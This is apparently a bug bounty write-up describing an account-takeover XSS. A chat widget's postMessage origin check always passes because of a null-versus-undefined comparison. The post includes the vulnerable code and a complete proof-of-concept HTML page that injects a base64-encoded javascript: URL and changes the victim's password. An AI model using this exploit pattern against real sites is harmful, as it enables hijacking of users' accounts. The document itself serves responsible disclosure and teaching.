---
layout: post
title: "Account takeover via postMessage"
tags: [postMessage,xss,javascript]
---

Hello everyone, I will share a simple and interesting xss completed through postMessage.<br/>
When I was looking for a site bug in a private program, I accidentally found a period javascript code, the code is as follows
```
t.prototype.redirectTo = function(t) {
    var e = String(t || "");
    document.location.href = e;
},
t.prototype.handleMessages = function(t) {
    var e = this.chatInstancesDetail.filter(function(e) {
        return e.domain.toLowerCase() === t.origin.toLowerCase()
    })[0];
    if (null !== e) {
        var i = document.getElementById(this.inlineChatFrameId)
          , n = i && i.parentElement;
        switch (t.data.command) {
        case "inline-chat-window-minimise":
            return n && (n.classList.remove("gnatta-inline-webchat"),
            n.classList.add("gnatta-inline-webchat-collapse"),
            this.toggleInlineChatScrollLock(n, !1)),
            void this.cookieService.create("InlineChatIsMinimized", "true", "", 0);
        case "inline-chat-window-maximise":
            return n && (n.classList.remove("gnatta-inline-webchat-collapse"),
            n.classList.add("gnatta-inline-webchat"),
            this.toggleInlineChatScrollLock(n, !0)),
            void this.cookieService["delete"]("InlineChatIsMinimized", "");
        case "inline-chat-window-close":
            return this.killInlineChat(),
            n && this.toggleInlineChatScrollLock(n, !1),
            void this.cookieService["delete"]("InlineChatIsMinimized", "");
        case "window-redirect":
            return this.redirectTo(t.data.completionRedirectUrl),
            void this.inlineChatSessionTrackingService.removeActiveChat()
        }
    }
}
```
After reading this code briefly, I found that he was listening to postMessage. 
Whenever I encounter the postMessage code, I always check to see if he checks the origin. 
This code clearly tells us that yes, he is checking the origin. All this does not seem to be a problem, but you may find that there is a problem with JavaScript. 
Let's take a look at the origin check code.
```
var e = this.chatInstancesDetail.filter(function(e) {
    return e.domain.toLowerCase() === t.origin.toLowerCase()
})[0];
if (null !== e) {//...}
```
Through observation I found that `this.chatInstancesDetail` is an array, and the `Array.prototype.filter` method always returns an array.
If you run the following code in the console
```
[1,2].filter((item)=>item===1)[0]
```
Will output `1`.
If the conditions are not met, the following code is listed
```
[1,2].filter((item)=>item===3)[0]
```
Will output `undefined`, followed by a judgment statement `if (null !== e) {//...}`.
In the javascript world, `==` and `===` are not the same.
Such as `null==undefined` and `null===undefined`, their results are different, which also leads to if judgment always being `true`.
So this detection code is meaningless, any domain name can communicate with it.
After this, I simply constructed a poc, the code is as follows
```
<!DOCTYPE html>
<html>
<head>
    <title>xss via postMessage</title>
</head>
<body>
    <a href="javascript:attack()">click me start attack</a>
    <script type="text/javascript">
        var ctx,interval,payload;
        payload=btoa(`
            window.opener.postMessage('attackSuccess','*');
            if(!window.cx){
                window.cx=1;
                email=$('#currentCustomerEmail').val();
                password='Hackerone123';
                $('input[name=newPassword]').val(password);
                $('input[name=checkNewPassword]').val(password);
                $('input[name=checkNewPassword]').removeAttr("disabled");
                alert('Hello '+email+' your password will be changed to: '+password);
                $('#updatePasswordForm').submit();
            }
        `);
        function attack(){
            ctx=window.open("https://example.com/xxx");
            sendPayload();
        }
        function sendPayload(){
            interval=setInterval(function(){
                ctx.postMessage({'command':'window-redirect','completionRedirectUrl':`javascript:eval(atob('${payload}'))`},'*');
            },500);
            window.addEventListener("message",function(e){
                if(e.data=="attackSuccess"){
                    clearInterval(interval);
                }
            });
        }
    </script>
</body>
</html>
```
After running the poc, you can successfully modify the victim's password.<br/>
Finally, thank you for reading
### Timeline
1. Submit Report (Oct 25th)
2. Hackerone staff changed the status to Triaged (Oct 26th)
3. The program responds for the first time (Nov 1st)
4. Rewarded $1,500 (Nov 1st)